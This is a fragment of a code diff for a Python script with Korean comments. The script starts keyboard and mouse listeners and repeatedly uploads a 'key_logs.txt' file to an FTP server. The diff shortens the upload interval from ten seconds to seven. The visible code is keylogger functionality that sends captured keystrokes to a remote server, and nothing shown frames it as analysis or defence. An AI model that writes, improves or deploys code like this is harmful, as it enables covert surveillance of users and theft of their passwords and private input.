@@ -55,7 +55,7 @@ keyboard_listener.start()
 mouse_listener = mouse.Listener(on_click=on_click)
 mouse_listener.start()
 
-# 10초 마다 FTP 서버에 파일 업로드
+# 7초 마다 FTP 서버에 파일 업로드
 while True:
     try:
         remote_file_path = 'key_logs.txt'  # FTP 서버에 업로드 될 경로
@@ -63,4 +63,4 @@ while True:
         print('File uploaded to FTP server.')
     except Exception as e:
         print(f'Error uploading file to FTP server: {e}')
-    time.sleep(10)
+    time.sleep(7)
